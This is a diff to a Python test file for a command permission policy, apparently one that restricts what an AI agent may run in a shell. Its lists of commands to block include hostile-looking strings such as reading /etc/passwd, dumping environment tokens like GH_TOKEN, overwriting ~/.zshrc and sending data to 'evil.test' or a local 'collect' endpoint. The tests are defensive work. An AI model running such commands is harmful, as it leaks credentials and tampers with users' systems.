@@ -140,7 +140,7 @@ class PermissionPolicyTests(unittest.TestCase):
                        'ls >& /tmp/x', 'ls &>> /tmp/x', 'ls 3> /tmp/x', 'ls <& 3', 'gh api -H x -XPUT repos/x',
                        'sort -o $HOME/.zshrc', 'ls ${HOME}', 'ls {/etc,x}', 'cut -f1 {/etc/passwd,x}', 'jq -n env', 'jq env.GH_TOKEN',
                        'jq -n input_filename', 'ls {notes,/etc}', 'ls {a..z}', 'cat <(id)', 'sort <(ls /etc)', 'ls >(tee x)',
-                       '(ls /etc)', 'ls ; (id)', 'jq . {/etc/passwd,x}', 'jq {/etc/passwd,.} x', 'jq {.,{/etc/passwd,y}} x',
+                       '(ls /etc)', 'ls ; (id)', 'ls x(y)', 'ls ( notes )', 'jq . {/etc/passwd,x}', 'jq {/etc/passwd,.} x', 'jq {.,{/etc/passwd,y}} x',
                        'jq {-n,.} x', 'jq {name:.n,id:.i} notes/x.json', "jq -n '{e,}nv'",
                        'gh api http://127.0.0.1:18777/collect?d=x', 'gh api //evil.test/x', 'gh pr list -R evil.test/o/r',
                        'gh pr list --repo=https://evil.test/o/r', 'gh pr list -Revil.test/o/r', 'gh pr list -R=evil.test/o/r',
@@ -153,7 +153,8 @@ class PermissionPolicyTests(unittest.TestCase):
                        'gh api repos/acme/app/dependabot/alerts --paginate --jq .[].severity', 'jq .items notes/x.json',
                        'cut -d: -f1 notes/x', 'uniq -c', 'sort | uniq -c', 'ls notes', 'date +%F', 'wc -l notes/x',
                        'gh api repos/x/y 2>/dev/null', 'ls 2>&1', 'tr a-z A-Z', 'jq {name:.n} notes/x.json',
-                       'jq .environment notes/x.json', 'jq . notes/x.json', 'gh pr list -R acme/app', 'tr [:upper:] [:lower:]', 'gh pr list --repo=acme/app', 'gh api /repos/acme/app/pulls', 'TWG_AGENT_DEFAULTS=1 twg jira workitem query --jql x', 'uniq -f 2 notes/x']
+                       'jq .environment notes/x.json', 'twg jira workitem query --jql "status IN (Done, Closed)"',
+                       "jq '.items | map(.id)' notes/x.json", 'jq . notes/x.json', 'gh pr list -R acme/app', 'tr [:upper:] [:lower:]', 'gh pr list --repo=acme/app', 'gh api /repos/acme/app/pulls', 'TWG_AGENT_DEFAULTS=1 twg jira workitem query --jql x', 'uniq -f 2 notes/x']
 
     def test_allowed_rules(self):
         for rule in self.ALLOWED:
